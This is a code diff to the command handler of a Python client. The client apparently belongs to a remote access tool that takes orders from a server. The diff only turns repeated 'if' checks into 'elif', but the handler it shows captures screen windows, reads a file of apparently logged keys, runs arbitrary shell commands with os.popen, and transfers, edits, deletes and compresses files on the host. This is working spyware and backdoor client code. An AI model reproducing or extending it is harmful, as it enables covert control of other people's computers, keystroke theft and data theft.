@@ -172,39 +172,39 @@ class Client:
         if msg.get("type") == "capture":
             data_bean.data = self.window_capture()  # window capture
             self.send(data_bean.json())
-        if msg.get("type") == "key":
+        elif msg.get("type") == "key":
             self.key_file.seek(0)
             data_bean.data = self.key_file.read().encode()  # key read from file
             self.send(data_bean.json())
-        if msg.get("type") == "shell":
+        elif msg.get("type") == "shell":
             data_bean.data = os.popen(msg["data"]).read().encode()
             self.send(data_bean.json())
-        if msg.get("type") == "dir":
+        elif msg.get("type") == "dir":
             data_bean.raw = File.dir(msg["data"])
             self.send(data_bean.json())
-        if msg.get("type") == "rename":
+        elif msg.get("type") == "rename":
             raw_data = msg["data"]
             data_bean.raw = File.rename(raw_data["file_abspath"], os.path.join(raw_data["dirname"], raw_data["rename"]))
             self.send(data_bean.json())
-        if msg.get("type") == "upload":
+        elif msg.get("type") == "upload":
             raw_path = msg["data"]["path"]
             raw_filename = msg["data"]["filename"]
             data_bean.raw = File.save_file(os.path.join(raw_path, raw_filename), base64.b64decode(msg["data"]["data"]))
             self.send(data_bean.json())
-        if msg.get("type") == "edit":
+        elif msg.get("type") == "edit":
             raw_path = msg["data"]["path"]
             data_bean.raw = File.edit(raw_path, msg["data"].get("data"))
             self.send(data_bean.json())
-        if msg.get("type") == "download":
+        elif msg.get("type") == "download":
             data_bean.data = File.download(msg["data"]["file_abspath"])
             self.send(data_bean.json())
-        if msg.get("type") == "del":
+        elif msg.get("type") == "del":
             data_bean.raw = File.del_file(msg["data"]["file_abspath"])
             self.send(data_bean.json())
-        if msg.get("type") == "zip":
+        elif msg.get("type") == "zip":
             data_bean.raw = File.compress_file(msg["data"]["last_dirname"]+msg["data"]["filename"]+".zip", msg["data"]["file_abspath"])
             self.send(data_bean.json())
-        if msg.get("type") == "unzip":
+        elif msg.get("type") == "unzip":
             data_bean.raw = File.uncompress(msg["data"]["file_abspath"], msg["data"]["last_dirname"])
             self.send(data_bean.json())
         else:
